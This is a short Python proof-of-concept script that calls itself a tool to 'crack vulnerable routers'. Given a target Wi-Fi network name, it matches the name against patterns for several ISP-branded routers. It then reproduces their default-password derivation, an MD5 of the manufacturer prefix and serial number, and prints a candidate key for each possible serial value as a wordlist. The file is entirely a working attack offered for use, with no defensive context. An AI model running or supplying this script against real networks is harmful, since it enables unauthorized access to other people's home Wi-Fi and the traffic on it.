#!/usr/bin/env python3

import argparse, base64,  hashlib, re

def genpwd_longpasswd(oui, serialnum):
	def str2md5(string):
		m = hashlib.md5()
		m.update(string.encode("ascii"))
		return m.digest()

	#secret1 = "%s-ALCL%s" % (oui, serialnum)
	secret2 = "%s-01%u" % (oui, int(serialnum, 16))

	#md5_secret1 = str2md5(secret1)
	md5_secret2 = str2md5(secret2)

	#wanpasswd = base64.b32encode(bytes(bytearray(md5_secret1[:16] + md5_secret2[:3]))).decode("ascii")[:30]

	lower = upper = i = 0

	for i in range(8):
		upper = (lower >> 0x18 | ((upper << 8)&0xffffffff))&0xffffffff
		lower = (((lower << 8)&0xffffffff) | md5_secret2[i + 8])&0xffffffff

	longpasswd = ((upper<<32)+lower)%0x2540be400

	return longpasswd

parser = argparse.ArgumentParser(prog="poc", description="A poc script to efficiently crack vulnerable routers")
parser.add_argument("ssid", type=str, help="the ssid to attack")
args = parser.parse_args()

oui   =     "D0542D"

ssids = [   "VIETTEL-[A-F0-9]{4}",
            "SKYTEL-[A-F0-9]{4}",
            "SINGTEL-[A-F0-9]{4}-5G-1",
            "SINGTEL-[A-F0-9]{4}",
            "ORANGEFIBER-[A-F0-9]{4}",
            "INFINITUM[A-F0-9]{4}_5-4",
            "INFINITUM[A-F0-9]{4}_5-3",
            "INFINITUM[A-F0-9]{4}_5-2",
            "INFINITUM[A-F0-9]{4}_5",
            "INFINITUM[A-F0-9]{4}_2.4-4",
            "INFINITUM[A-F0-9]{4}_2.4-3",
            "INFINITUM[A-F0-9]{4}_2.4-2",
            "INFINITUM[A-F0-9]{4}_2.4",
            "GO_WiFi_[A-F0-9]{4}",
            "ALHN-[A-F0-9]{4}-4",
            "ALHN-[A-F0-9]{4}-3",
            "ALHN-[A-F0-9]{4}-11ac-4",
            "ALHN-[A-F0-9]{4}-11ac-3",
            "ALHN-[A-F0-9]{4}-11ac-2",
            "ALHN-[A-F0-9]{4}-11ac",
            "ALHN-[A-F0-9]{4}"]

wordlist = set()

for s in ssids:
    if re.match(s, args.ssid) != None:
        serialBytes = args.ssid
        for r in s.split("[A-F0-9]{4}"):
            serialBytes = serialBytes.replace(r, "")
        for i in range(0xffff):
            print(genpwd_longpasswd(oui, "{:04x}{}".format(i, serialBytes)))
        break
